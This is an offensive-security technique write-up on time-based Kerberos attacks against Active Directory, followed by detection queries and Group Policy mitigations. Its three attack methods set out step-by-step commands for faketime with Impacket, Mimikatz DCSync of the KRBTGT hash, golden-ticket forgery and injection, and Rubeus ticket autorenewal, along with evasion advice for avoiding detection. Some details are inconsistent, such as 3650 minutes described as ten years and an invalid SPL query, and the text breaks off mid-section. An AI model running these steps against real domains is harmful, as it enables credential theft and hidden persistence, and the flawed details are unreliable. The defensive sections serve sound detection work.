# [CA-KERB-010]: Time-Based Kerberos Exploitation

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-010 |
| **MITRE ATT&CK v18.1** | [T1558 - Steal or Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/) |
| **Tactic** | Credential Access, Persistence |
| **Platforms** | Windows AD (Server 2016-2025), Kerberos-enabled Unix/Linux |
| **Severity** | **HIGH** |
| **CVE** | N/A (architectural weakness in Kerberos time enforcement) |
| **Technique Status** | ACTIVE (Persistent architectural issue) |
| **Last Verified** | 2024-12-15 |
| **Affected Versions** | Server 2016-2025 (all versions if time is not synchronized) |
| **Patched In** | N/A - Requires operational controls (time sync, ticket lifetime reduction, monitoring) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

**Note:** Sections 6 (Atomic Red Team) omitted because time-based attacks are environment-specific and depend on system clock manipulation, not included in standard atomic test libraries. All section numbers have been dynamically renumbered based on applicability.

---

## 2. EXECUTIVE SUMMARY

**Concept:** Time-based Kerberos exploitation attacks leverage the Kerberos protocol's reliance on synchronized system clocks to execute attacks that would otherwise be impossible. Kerberos uses timestamps for multiple security-critical purposes: validating pre-authentication (AS-REQ), verifying ticket freshness, checking ticket expiration, and preventing replay attacks. An attacker who can manipulate a target system's clock, exploit clock skew tolerance (default 5 minutes), or forge tickets with arbitrary timestamps can (1) bypass pre-authentication requirements, (2) create Golden Tickets with extended lifetimes (10 years instead of 10 hours), (3) renew stolen tickets beyond their normal 7-day window, or (4) request service tickets for expired user accounts that should be inaccessible. These attacks enable long-term persistence, privilege escalation, and unauthorized access to any resource in the domain.

**Attack Surface:** Time-based Kerberos attacks affect any environment where:
1. System clocks are not tightly synchronized across the domain (±5 minutes default tolerance)
2. Kerberos ticket lifetimes are not reduced below default (10 hours)
3. Ticket renewal is not restricted or monitored
4. Attackers can manipulate system clocks on compromised machines (via `faketime`, BIOS changes, or time provider modifications)
5. Event logging (4768, 4769, 4770) is not enabled or analyzed

**Business Impact:** An attacker can maintain persistent access to any domain resource indefinitely by extending ticket lifetimes and renewing stolen tickets. Even if credentials are reset, the attacker can continue using the forged ticket until the KRBTGT account password is rotated. This enables sustained data exfiltration, ransomware deployment, lateral movement, and establishment of backdoors that survive password changes and account disablement.

**Technical Context:** Time-based attacks leverage a fundamental design trade-off in Kerberos: tight time synchronization is required for security, but the protocol is designed to tolerate up to 5 minutes of clock skew for practical reasons (NTP isn't always available, virtualized systems drift, etc.). The default Kerberos ticket lifetime is 10 hours, which is a compromise between security (shorter lifetime = less time for ticket abuse) and usability (very short lifetimes require constant re-authentication). An attacker who controls system time or forges timestamps can exceed both constraints.

### Operational Risk

- **Execution Risk:** **MEDIUM** - Requires either system compromise (to manipulate clock) or prior credential theft (to forge tickets); not trivial but feasible in realistic scenarios
- **Stealth:** **HIGH** - Golden Ticket attacks with extended lifetimes blend into normal Kerberos traffic; most environments don't monitor ticket lifetimes; clock manipulation is not always detected
- **Reversibility:** **NO** - Extended lifetime tickets continue to work until KRBTGT is rotated; renewed tickets can extend access by weeks or months

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.4.1 | "Ensure 'Maximum lifetime for user ticket' is set to '4 hours or less'" |
| **CIS Benchmark** | 5.2.4.4 | "Ensure Kerberos pre-authentication is required" |
| **DISA STIG** | V-220978 | Kerberos ticket lifetime must be audited and restricted |
| **NIST 800-53** | SC-3 | Security Functions: Time-based access control validation |
| **NIST 800-53** | AC-3 | Access Enforcement - lifetime must be enforced |
| **GDPR** | Art. 32 | Security of Processing - temporal controls on access |
| **DORA** | Art. 9 | Protection and Prevention - authentication resilience |
| **NIS2** | Art. 21 | Cyber Risk Management Measures |
| **ISO 27001** | A.12.4.1 | Event logging of time-sensitive authentication |
| **ISO 27005** | Risk Scenario | Unauthorized persistence via temporal exploitation |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- For clock manipulation: Local administrator access on target system, OR ability to modify W32Time service, OR access to BIOS/firmware
- For ticket forgery: Access to KRBTGT account hash (requires DC compromise)
- For ticket renewal abuse: Valid Kerberos ticket (can be stolen via LSASS dump, credential theft, or ticket capture)

**Required Access:**
- Network access to Key Distribution Center (port 88/TCP or 88/UDP)
- For clock skew exploitation: No special network access required (local manipulation only)
- For faketime usage: Ability to execute commands on compromised Linux/Exegol system

**Supported Versions:**

| Version | Status | Notes |
|---|---|---|
| **Windows Server 2016** | VULNERABLE | Default 10-hour ticket lifetime; minimal monitoring of renewals |
| **Windows Server 2019** | VULNERABLE | Same as 2016; time tolerance not enforced strictly |
| **Windows Server 2022** | VULNERABLE | Improved W32Time but still vulnerable if not tuned; 10-hour default |
| **Windows Server 2025** | VULNERABLE | Same vulnerabilities persist; architectural issue not fixed |
| **Linux/Unix (MIT Kerberos)** | VULNERABLE | Same time-based attacks possible on Kerberos-enabled Unix systems |

**Tools:**
- [faketime](https://linux.die.net/man/1/faketime) - Manipulate system time for processes (Linux)
- [Rubeus](https://github.com/GhostPack/Rubeus) - Kerberos ticket manipulation and renewal
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) - Golden Ticket generation and injection
- [ntpdate](https://linux.die.net/man/8/ntpdate) - Synchronize time with NTP server
- [w32tm](https://learn.microsoft.com/en-us/windows-server/networking/windows-time-service/windows-time-service-tools-and-settings) - Windows time service management
- [Impacket](https://github.com/fortra/impacket) - Kerberos ticket manipulation on Linux

**Other Requirements:**
- Python 3.6+ (for Impacket)
- Administrator rights on compromised machine (optional, for some clock manipulation methods)
- Knowledge of DC IP/hostname and domain SID (for Golden Tickets)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### 4.1 Check System Clock Synchronization Status

#### Step 1: Verify Time Synchronization on All Machines

**Command (PowerShell - Any Domain Machine):**
```powershell
# Check current time sync status
w32tm /query /status

# Expected output:
# Leap Indicator: 0 (no leap second)
# Stratum: 2 (synced to PDC Emulator)
# Precision: -6 (one second / 64)
# Root Delay: 0.0000000s
# Root Dispersion: 0.0156250s
# ReferenceId: 0xC0A81001 (192.168.1.1 - PDC Emulator)
# Last Successful Sync Time: 1/6/2026 8:00:00 AM
# Source: DC.contoso.com

# If "Source: CMOS Clock" appears, the machine is NOT synced to AD time (VULNERABLE)
```

**What to Look For:**
- `ReferenceId: 0xC0A81001...`: Synced to PDC Emulator (good)
- `Source: CMOS Clock`: Machine using local BIOS clock (very bad - vulnerable)
- `Source: PERIOD.NTP.ORG`: Synced to external NTP (acceptable)
- Time diff from current time: Should be within seconds, not minutes

**Version Note:** Command works identically on Server 2016-2025.

#### Step 2: Check Clock Skew Tolerance Policy

**Command (PowerShell - Domain Controller):**
```powershell
# Check Kerberos clock skew tolerance (should be 5 minutes = 300 seconds by default)
Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\Kdc' -Name MaxClockSkew

# Output:
# MaxClockSkew : 300  # 5 minutes in seconds (default and recommended)

# A value > 600 (10 minutes) is vulnerable; > 1800 (30 minutes) is critically vulnerable
```

**What to Look For:**
- Value = 300: Secure (5-minute default)
- Value > 300: Increasingly vulnerable as tolerance grows
- Value > 1800: Critical vulnerability (attackers have 30-minute window)

#### Step 3: Check Kerberos Ticket Lifetime Policies

**Command (PowerShell - Group Policy on DC):**
```powershell
# Check default ticket lifetimes via Group Policy
gpresult /h gpresult.html
# Then search the HTML for "Maximum lifetime for user ticket"

# Or via registry on local machine:
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Security' `
  -Name KerberosMaxTicketAge

# Common values:
# 28800 seconds = 8 hours (older default)
# 36000 seconds = 10 hours (current Windows default)
# Value can be reduced to 21600 (6 hours) or 14400 (4 hours) for security
```

**What to Look For:**
- 36000+ seconds (10+ hours): Vulnerable to extended attack windows
- 14400 seconds (4 hours) or less: Secure

#### Step 4: Check for Clock Skew Errors in Event Logs

**Command (PowerShell - Domain Controller):**
```powershell
# Search for Kerberos clock skew errors (Event ID 37 on KDC)
Get-WinEvent -LogName "System" -FilterXPath "*[System[(EventID=37)]]" -MaxEvents 20 |
  Select-Object TimeCreated, Message

# Look for patterns:
# - Multiple failures from same source = possible clock-skewed attacker
# - Failures followed by successful auth = exploited clock skew tolerance
# - Unusually high frequency = sign of attack probing
```

**What to Look For:**
- Frequent clock skew errors from same IP = suspicious
- Pattern: Error → Success within 5 minutes = attacker exploiting tolerance
- Errors during business hours = human users affected (bad; indicates infrastructure issue)

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Clock Skew Exploitation via faketime (Linux)

**Supported Versions:** Server 2016-2025 (if attacker has Linux-based attack platform)

**Prerequisites:** Attacker has compromised Linux/Exegol system; knows DC IP/hostname

#### Step 1: Detect Current Time Difference Between Attacker and DC

**Objective:** Measure how far attacker's clock is ahead/behind the Domain Controller's time.

**Command (Bash - On Attacker's Machine):**
```bash
# Get attacker's current time
echo "Attacker time: $(date)"

# Get DC's time via NTP query
ntpdate -q 192.168.1.10

# Output:
# server 192.168.1.10, stratum 2, offset 0.020847, delay 0.02639
# Attacker time: Wed Jan 6 12:34:56 CET 2026
# DC time: Wed Jan 6 12:34:36 UTC 2026  (20 seconds behind attacker)

# Calculation: DC is 20 seconds behind = attacker can use faketime with +20 second offset
```

**What This Means:**
- Offset is the time difference in seconds
- Positive offset: Attacker is ahead (use negative in faketime)
- Negative offset: Attacker is behind (use positive in faketime)
- Within 5 minutes (±300 seconds) = exploitable with clock skew tolerance

#### Step 2: Request TGT Using faketime Within Tolerance Window

**Objective:** Execute Kerberos authentication with time adjusted to fall within DC's 5-minute tolerance.

**Command (Using Impacket getTGT.py with faketime):**
```bash
# Set time to DC's time (or within ±5 minutes of it)
# Syntax: faketime 'adjustment' command

# Example 1: Set time 20 seconds ahead to match DC
faketime '+20s' python3 getTGT.py -hashes :8846f7eaee8fb117ad06bdd830b7586c \
  contoso.com/user 192.168.1.10 user.ccache

# Example 2: Use explicit timestamp to match DC's time
faketime '2026-01-06 12:34:36' python3 getTGT.py -hashes :8846f7eaee8fb117ad06bdd830b7586c \
  contoso.com/user 192.168.1.10 user.ccache

# Output (Success):
# [*] Saving ticket in user.ccache

# Output (Failure - outside tolerance):
# [*] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

**Expected Output:**
```
TGT successfully obtained within clock skew tolerance
Ticket saved and ready for use
```

**What This Means:**
- faketime trick allows bypassing strict clock requirements
- Allows pre-authentication timestamp to validate at DC
- Enables any Kerberos operations for the duration of faketime session

**OpSec & Evasion:**
- faketime operates only for the spawned process; doesn't affect system clock
- No Event ID 37 (clock skew error) triggered since requests are within tolerance
- Evasion: Perform all Kerberos operations within single faketime session
- Run from VPN/proxy so DC doesn't see consistent source IP

**Troubleshooting:**
- **Error:** `KRB_AP_ERR_SKEW` persists despite faketime
  - **Cause:** Time offset calculated incorrectly; timezone mismatch between attacker and DC
  - **Fix:** Account for UTC vs. local time; use `date --utc` on DC and attacker to verify
  - **Fix 2:** Use explicit timestamp: `faketime '2026-01-06 12:34:36 UTC' ...`

#### Step 3: Use Obtained TGT for Lateral Movement

**Objective:** Leverage the obtained TGT to request service tickets and access resources.

**Command:**
```bash
# Export ccache for subsequent Kerberos operations
export KRB5CCNAME=user.ccache

# Request service ticket for target system
python3 getST.py -k -no-pass contoso.com/user@contoso.com cifs/fileserver.contoso.com

# Access target system
python3 psexec.py -k -no-pass fileserver.contoso.com

# Output:
# C:\> whoami
# contoso\user
```

**What This Means:**
- TGT obtained via clock skew can be used for normal lateral movement
- No additional time manipulation needed after TGT is obtained
- Full access to any service the user is authorized for

---

### METHOD 2: Golden Ticket with Extended Lifetime (Mimikatz)

**Supported Versions:** Server 2016-2025 (if KRBTGT hash is available)

**Prerequisites:** Attacker has KRBTGT account hash (from DCSync or DC compromise)

#### Step 1: Obtain KRBTGT Account Hash and Domain SID

**Objective:** Extract the cryptographic key needed to forge TGTs, and identify the domain.

**Command (Mimikatz - On DC or via DCSync):**
```powershell
# Method 1: On Domain Controller (local admin required)
mimikatz.exe "privilege::debug" "token::elevate" `
  "lsadump::sam /system:C:\\Windows\\System32\\config\\SYSTEM /sam:C:\\Windows\\System32\\config\\SAM" "exit"

# Look for KRBTGT account output (won't be in SAM; try lsadump::dcsync instead)

# Method 2: DCSync from any machine (requires AD replication permissions)
mimikatz.exe "privilege::debug" `
  "lsadump::dcsync /user:krbtgt@contoso.com /domain:contoso.com /dc:dc01.contoso.com" "exit"

# Output:
# Object RID : 502
# Default password context :
#  Username : krbtgt
#  Domain   : CONTOSO
#  Password : (blank hash)
# Hash NTLM: 8846f7eaee8fb117ad06bdd830b7586c
```

**Expected Output:**
```
KRBTGT account hash: 8846f7eaee8fb117ad06bdd830b7586c
Domain: CONTOSO
Domain SID: S-1-5-21-3623811015-3361044348-30300820 (extract via whoami /all or Get-ADDomain)
```

**What This Means:**
- KRBTGT hash is the master key for signing all TGTs
- With this hash, any TGT forged will be accepted by the KDC
- SID identifies the domain for SID history in forged tickets

#### Step 2: Identify Domain SID and Target User

**Objective:** Gather information needed to create realistic Golden Ticket.

**Command (PowerShell - Any domain machine):**
```powershell
# Get domain SID
(Get-ADDomain).DomainSID

# Get target user's RID (Relative Identifier)
Get-ADUser Administrator | Select-Object SamAccountName, ObjectSID

# Example output:
# ObjectSID: S-1-5-21-3623811015-3361044348-30300820-500 (500 = Administrator RID)
```

**What to Look For:**
- Domain SID: S-1-5-21-... (21 = domain)
- User RID: Last component (500=Administrator, 501=Guest, 502+=regular users)
- Full SID = Domain SID + RID (e.g., S-1-5-21-xxx-xxx-xxx-500 for Domain Admin)

#### Step 3: Create Golden Ticket with Extended Lifetime

**Objective:** Forge a TGT with arbitrary lifetime (10 years instead of 10 hours).

**Command (Mimikatz):**
```powershell
# Create Golden Ticket with 10-year lifetime (forged)
mimikatz.exe "privilege::debug" `
  "kerberos::golden /user:Administrator /domain:contoso.com /sid:S-1-5-21-3623811015-3361044348-30300820 `
    /krbtgt:8846f7eaee8fb117ad06bdd830b7586c `
    /ticket:Administrator.kirbi `
    /startoffset:-10 `
    /endin:3650 `
    /renewmax:3650" "exit"

# Parameter explanation:
# /user: Target user to impersonate
# /domain: Domain FQDN
# /sid: Domain SID
# /krbtgt: KRBTGT account NTLM hash (the signing key)
# /ticket: Output file for forged TGT
# /startoffset: Start time offset in minutes (default now; can be negative for backdating)
# /endin: Ticket validity duration in minutes (3650 = ~10 years; default 600 = 10 hours)
# /renewmax: Maximum renewal time in minutes (3650 = ~10 years; default 10080 = 7 days)

# Output:
# [+] Ticket written to file: Administrator.kirbi
# [+] Golden Ticket created successfully
```

**Expected Output:**
```
Golden Ticket (.kirbi file) created with:
- User: Administrator
- Lifetime: 10 years (instead of default 10 hours)
- Renewable: 10 years (instead of default 7 days)
- Signed with KRBTGT key (appears legitimate to KDC)
```

**What This Means:**
- Forged TGT will be accepted by any DC in the domain indefinitely
- No password required for impersonation
- Ticket appears legitimate (cryptographically valid signature)
- Can be renewed automatically for 10 years

**OpSec & Evasion:**
- Set `/endin` to match your environment's policy (default 600 mins = 10 hours)
- Attackers often use realistic lifetimes to avoid anomaly detection
- Use `/startoffset:-10` to backdate ticket creation (looks like it was issued earlier)
- Avoid creating tickets with extreme lifetimes (e.g., 100 years) - stands out in logs

**Troubleshooting:**
- **Error:** `KRBTGT hash not found`
  - **Cause:** Incorrect hash value
  - **Fix:** Verify hash via `lsadump::dcsync`
  
- **Error:** `Ticket will not be honored - SID mismatch`
  - **Cause:** Incorrect domain SID
  - **Fix:** Verify SID: `Get-ADDomain | Select-Object DomainSID`

#### Step 4: Inject Golden Ticket into LSASS and Use for Access

**Objective:** Load the forged TGT into memory and use it to access resources.

**Command (Mimikatz):**
```powershell
# Inject Golden Ticket into LSASS
mimikatz.exe "privilege::debug" `
  "kerberos::ptt C:\path\to\Administrator.kirbi" "exit"

# Verify ticket injection
klist

# Expected output:
# Cached Tickets (2):
# [0] Initial (U) -> krbtgt/contoso.com, Administrator@contoso.com
# [1] Valid starting 1/6/2026 08:00:00, Expires 1/6/2036 08:00:00
# [2] Renew until 1/6/2036 08:00:00

# Now access resources as Administrator (even if real password is changed)
net use \\dc01.contoso.com\C$ /user:contoso.com\Administrator
dir \\dc01.contoso.com\C$

# Output:
# Successfully connected to DC as Administrator (via forged ticket)
```

**Expected Output:**
```
Golden Ticket injected into LSASS
Can access any resource as Administrator indefinitely
Ticket valid for 10 years (or until KRBTGT rotation)
```

**What This Means:**
- Full impersonation of Administrator achieved
- Can access Domain Controller, file shares, databases, etc.
- Persistence maintained even if Administrator password is changed
- Ticket remains valid until KRBTGT is reset

**OpSec & Evasion:**
- Inject ticket only when needed (don't keep in memory if not using)
- Use `/ppt` flag to inject into current session only (Mimikatz default)
- Avoid injecting many Golden Tickets; use one per session
- Evasion: Create ticket with realistic lifetime to match environment policy

**References:**
- [SpecterOps - Golden Ticket](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/ticket-requests/golden)
- [Microsoft - KRBTGT Account Security](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/ad-forest-recovery-single-domain-recovery)

---

### METHOD 3: Ticket Renewal Abuse via Rubeus /autorenew

**Supported Versions:** Server 2016-2025 (if attacker has valid TGT)

**Prerequisites:** Attacker has stolen or extracted a valid TGT; wants to extend its lifetime automatically

#### Step 1: Extract TGT from Compromised Machine

**Objective:** Obtain a valid TGT from LSASS or ticket cache.

**Command (Mimikatz):**
```powershell
# Export current user's TGT from LSASS
mimikatz.exe "privilege::debug" `
  "kerberos::list /export" "exit"

# Output files:
# [0] - krbtgt~contoso.com@CONTOSO.COM.kirbi
# [1] - cifs/fileserver~contoso.com@CONTOSO.COM.kirbi

# Or use Rubeus to extract tickets
.\Rubeus.exe triage
# Lists all cached tickets

.\Rubeus.exe dump /user:Administrator
# Dumps specific user's tickets in base64
```

**Expected Output:**
```
TGT extracted and saved as .kirbi file
Contains ticket expiration time (typically 10 hours from issue)
Can be transferred to attacker machine
```

**What This Means:**
- Stolen TGT can be renewed repeatedly until renewal limit expires (default 7 days)
- Each renewal resets the validity window by 10 hours
- Allows continued access for up to 7 days after single credential compromise

#### Step 2: Renew TGT Automatically Before Expiration

**Objective:** Set up automatic renewal to prevent ticket expiration and maintain access.

**Command (Rubeus /autorenew):**
```powershell
# Renew TGT with autorenew flag to automatically refresh every 30 minutes
.\Rubeus.exe renew /ticket:Administrator.kirbi /dc:dc01.contoso.com /autorenew

# This will:
# 1. Request renewal of the TGT immediately
# 2. Sleep for (endtime - 30 minutes)
# 3. Automatically renew again before expiration
# 4. Repeat until renewal limit is reached (7 days by default)

# Output:
# [*] Action: Renew Kerberos Ticket
# [*] Using ticket from Administrator.kirbi
# [*] Sending TGT renewal to dc01.contoso.com
# [+] TGT renewed successfully
# [+] New endtime: 1/6/2026 19:00:00 (10 hours from now)
# [*] Sleeping 570 minutes until 30 mins before expiration
# [*] Next renewal in 570 minutes...

# After sleep period, cycle repeats automatically
```

**Expected Output (Continuous):**
```
[*] Sleeping 570 minutes...
[+] TGT renewed successfully (repeats every 10 hours)
[*] Next renewal in 570 minutes...
```

**What This Means:**
- TGT will remain valid for full 7-day renewal window (if left running)
- Attacker can maintain access for a week from single credential theft
- Requires keeping process running, but can be run as background service

**OpSec & Evasion:**
- Run in separate terminal/screen session so it's hidden
- Consider running as scheduled task on compromised machine
- Evasion: Monitor will detect Event 4770 (ticket renewal) - this is normal in busy domains
- Mitigation: Reduce renewal lifetime to 1-2 days via Group Policy

**Troubleshooting:**
- **Error:** `Renewal limit reached`
  - **Cause:** 7-day renewal window has expired
  - **Fix:** Request new TGT (requires password or new credential theft)

#### Step 3: Detect Renewal Limit and Request New TGT Before Expiration

**Objective:** Track renewal limit and request fresh TGT before old one becomes unusable.

**Command:**
```powershell
# Check ticket properties including renewal limit
.\Rubeus.exe triage

# Output:
# [0] - krbtgt/contoso.com@CONTOSO.COM.kirbi
#   EndTime: 1/6/2026 18:00:00
#   RenewUntil: 1/13/2026 08:00:00 (renewal limit)
#   TimeLeft: 9:45:30

# When TimeLeft < 10 minutes, renewal is no longer possible
# Request new TGT before this time:
.\Rubeus.exe asktgt /user:Administrator /domain:contoso.com /hash:8846f7eaee8fb117ad06bdd830b7586c

# Or if password is still valid:
.\Rubeus.exe asktgt /user:Administrator /domain:contoso.com /password:P@ssw0rd!
```

**What This Means:**
- Allows continuous renewal as long as account is not disabled
- If account password is reset, attacker loses ability to request new TGT
- Need to plan attack to re-compromise machine before renewal window closes (7 days)

---

## 6. TOOLS & COMMANDS REFERENCE

### [faketime](https://linux.die.net/man/1/faketime)

**Version:** Latest (included in most Linux distributions)  
**Supported Platforms:** Linux, macOS, Exegol

**Installation:**
```bash
apt-get install faketime  # Debian/Ubuntu
yum install faketime      # RHEL/CentOS
brew install libfaketime  # macOS
```

**Usage:**
```bash
# Relative time adjustment
faketime '+2h' date       # Add 2 hours
faketime '-30m' command   # Subtract 30 minutes

# Absolute time
faketime '2026-01-06 12:34:56' python3 getTGT.py ...

# NTP-based sync to DC time
faketime "$(ntpdate -q 192.168.1.10 | cut -d ' ' -f 1,2)" getTGT.py ...
```

---

### [Rubeus](https://github.com/GhostPack/Rubeus)

**Version:** 1.6.4+  
**Supported Platforms:** Windows

**Usage (Renewal):**
```powershell
# Renew TGT immediately
.\Rubeus.exe renew /ticket:user.kirbi /dc:dc01.contoso.com

# Automatic renewal every 30 mins
.\Rubeus.exe renew /ticket:user.kirbi /dc:dc01.contoso.com /autorenew

# Inject into LSASS after renewal
.\Rubeus.exe renew /ticket:user.kirbi /dc:dc01.contoso.com /autorenew /ptt
```

---

### [Mimikatz](https://github.com/gentilkiwi/mimikatz)

**Version:** Latest (2.2.0+)  
**Supported Platforms:** Windows (x86, x64)

**Usage (Golden Ticket):**
```powershell
# Generate Golden Ticket
mimikatz "kerberos::golden /user:Administrator /domain:contoso.com /sid:S-1-5-21-... /krbtgt:hash /ticket:out.kirbi /endin:3650"

# Inject into LSASS
mimikatz "kerberos::ptt out.kirbi"

# Verify injection
mimikatz "kerberos::list"
```

---

## 7. SPLUNK DETECTION RULES

### Rule 1: Extended Ticket Lifetime Anomaly

**Rule Configuration:**
- **Required Index:** `wineventlog`
- **Required Sourcetype:** `WinEventLog:Security`
- **Required Fields:** `EventCode`, `Ticket_Lifetime`, `Account_Name`
- **Alert Threshold:** Ticket lifetime > 1440 minutes (24 hours, default is 600 = 10 hours)
- **Applies To Versions:** All

**SPL Query:**
```spl
index=wineventlog source=WinEventLog:Security EventCode=4768
| stats max(Ticket_Lifetime) as max_lifetime by Account_Name, Client_Address
| where max_lifetime > 1440
| eval lifetime_hours = round(max_lifetime / 60, 2)
| eval risk = "HIGH"
```

---

### Rule 2: Ticket Renewal Without Preceding TGT

**SPL Query:**
```spl
index=wineventlog source=WinEventLog:Security (EventCode=4769 OR EventCode=4770)
| stats min(_time) as first_event, max(EventCode) as event_type by Account_Name, Client_Address
| search event_type=4770
| where NOT (event_type=4768 OR event_type=4769 before 4770 within 1h)
| eval suspicious="renewal_without_tgt"
```

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: Golden Ticket with Extended Lifetime

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4768
| extend TicketLifetime = toint(extract("Ticket_Lifetime: (\\d+)", 1, EventData))
| where TicketLifetime > 1440  // > 24 hours (normal is 600 mins = 10 hours)
| project TimeGenerated, Account_Name, Client_IP, TicketLifetime
| summarize AlertCount = count() by Account_Name, bin(TimeGenerated, 1h)
| where AlertCount > 1  // Multiple long-lifetime tickets
```

---

## 9. WINDOWS EVENT LOG MONITORING

**Event ID: 4768 (TGT Requested)**
- **Suspicious indicators:** TicketLifetime > 1440 minutes (24 hours)
- **Suspicious indicators:** TicketRenewUntil > 10080 minutes (7 days) on forged tickets
- **Normal pattern:** TicketLifetime = 600-900 minutes (10-15 hours)

**Event ID: 4770 (Ticket Renewed)**
- **Suspicious indicators:** Multiple renewals from same user/IP over extended period
- **Suspicious indicators:** Renewals after account password change (ticket should be invalid)
- **Suspicious indicators:** Renewals after account disable

**Manual Configuration:**
```powershell
# Enable detailed Kerberos auditing on DCs
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
```

---

## 10. SYSMON DETECTION PATTERNS

```xml
<Sysmon schemaversion="4.82">
  <!-- Monitor for faketime execution on Linux -->
  <RuleGroup name="Process Creation" groupRelation="or">
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">faketime</CommandLine>
      <CommandLine condition="contains">getTGT</CommandLine>
      <CommandLine condition="contains">Kerberos</CommandLine>
    </ProcessCreate>
  </RuleGroup>

  <!-- Monitor for Rubeus ticket operations -->
  <RuleGroup name="Process Creation" groupRelation="or">
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">Rubeus.exe</CommandLine>
      <CommandLine condition="contains">renew</CommandLine>
      <CommandLine condition="contains">autorenew</CommandLine>
    </ProcessCreate>
  </RuleGroup>

  <!-- Monitor for Mimikatz Golden Ticket generation -->
  <RuleGroup name="Process Creation" groupRelation="or">
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">mimikatz</CommandLine>
      <CommandLine condition="contains">kerberos::golden</CommandLine>
      <CommandLine condition="contains">krbtgt</CommandLine>
    </ProcessCreate>
  </RuleGroup>
</Sysmon>
```

---

## 11. MICROSOFT DEFENDER FOR CLOUD

**Alert Name:** "Suspicious Kerberos ticket with extended lifetime detected"  
**Alert Name:** "Potential Golden Ticket attack - ticket renewal abuse"

---

## 12. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1: Reduce Kerberos Ticket Lifetime**

**Current State:** Default 10-hour lifetime is too long for security; reduces detection window.

**Applies To Versions:** All (Server 2016-2025)

**Manual Steps (Group Policy):**
1. Open `gpmc.msc`
2. Navigate to **Computer Configuration → Policies → Windows Settings → Security Settings → Account Policies → Kerberos Policy**
3. Find: **Maximum lifetime for user ticket**
4. Change from 600 minutes (10 hours) to 240 minutes (4 hours)
5. Also set **Maximum lifetime for user ticket renewal** to 1440 minutes (1 day, down from 10080/7 days)
6. Run `gpupdate /force` on all machines

**Manual Steps (PowerShell):**
```powershell
# Set via Group Policy Object
$policy = Get-GPO -Name "Default Domain Policy" -Domain contoso.com
Set-GPRegistryValue -Guid $policy.Id -Key "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" `
  -ValueName MaxTicketAge -Type DWord -Value 240  # 4 hours instead of 600 minutes (10 hours)
```

**Validation Command:**
```powershell
# After GPO application, verify new value
Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\Kdc' -Name MaxTicketAge

# Expected output:
# MaxTicketAge : 240  (4 hours in minutes)
```

**Expected Impact:**
- Shorter window for attackers to abuse stolen tickets
- Users may need to re-authenticate more frequently (user experience impact)
- Recommended: Coordinate with help desk for user notification

---

**Mitigation 2: Enforce Strict Time Synchronization**

**Applies To Versions:** All

**Manual Steps (Group Policy):**
1. Open `gpmc.msc`
2. Navigate to **Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options**
3. Find: **Maximum tolerance for computer clock synchronization**
4. Set to 5 minutes (default; do NOT increase)
5. Set **Kerberos maximum clock skew** to 300 seconds (5 minutes)
6. Run `gpupdate /force`

**Manual Steps (PowerShell - Set on all DCs):**
```powershell
# Ensure strict clock sync on all Domain Controllers
$DCs = Get-ADDomainController -Filter *

foreach ($DC in $DCs) {
    Invoke-Command -ComputerName $DC.Name -ScriptBlock {
        # Configure NTP to sync with external reliable source
        w32tm /config /manualpeerlist:"time.nist.gov" /syncfromflags:manual /reliable:yes /update
        w32tm /resync /rediscover
        w32tm /query /status
    }
}
```

**Validation:**
```powershell
# Verify all machines are synced to within 5 seconds of DC
foreach ($computer in @("DC01", "SERVER01", "WORKSTATION01")) {
    $dc_time = Invoke-Command -ComputerName "DC01" -ScriptBlock { [datetime]::UtcNow }
    $client_time = Invoke-Command -ComputerName $computer -ScriptBlock { [datetime]::UtcNow }
    $diff = ($dc_time - $client_time).TotalSeconds
    Write-Host "$computer time diff from DC: $diff seconds"
}

# All should be < 5 seconds
```

---

**Mitigation 3: Enable and Monitor Kerberos Event Logging**

**Applies To Versions:** All

**Manual Steps:**
1. Enable Kerberos auditing on all DCs:
```powershell
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
```

2. Configure SIEM/Splunk to alert on:
   - Event 4768 with ticket lifetime > 1440 minutes
   - Event 4770 (ticket renewal) without preceding 4768 (indicates Golden Ticket)
   - Event 4770 renewals for disabled accounts
   - Patterns of continuous renewals from same source

---

### Priority 2: HIGH

**Mitigation 4: Reduce Ticket Renewal Limit**

**Applies To Versions:** All

**Manual Steps (Group Policy):**
1. Open `gpmc.msc`
2. Navigate to **Kerberos Policy**
3. Find: **Maximum lifetime for user ticket renewal**
4. Change from 10080 minutes (7 days) to 1440 minutes (1 day)
5. Apply and verify

**Impact:** Reduces persistence window for stolen tickets from 7 days to 1 day.

---

**Mitigation 5: Implement Credential Guard on Endpoints**

**Applies To Versions:** Server 2016+ (with TPM 2.0 and UEFI firmware)

**Manual Steps (PowerShell):**
```powershell
# Enable Windows Defender Credential Guard
# Requires VM isolation on Server 2016+

# Check if prerequisites are met
Get-ComputerInfo | Select-Object HyperVRequirementsTpm20Present, HyperVRequirementsSecureBoot

# Enable via Group Policy (Server 2016+)
# Computer Configuration → Policies → Administrative Templates → System → Device Guard
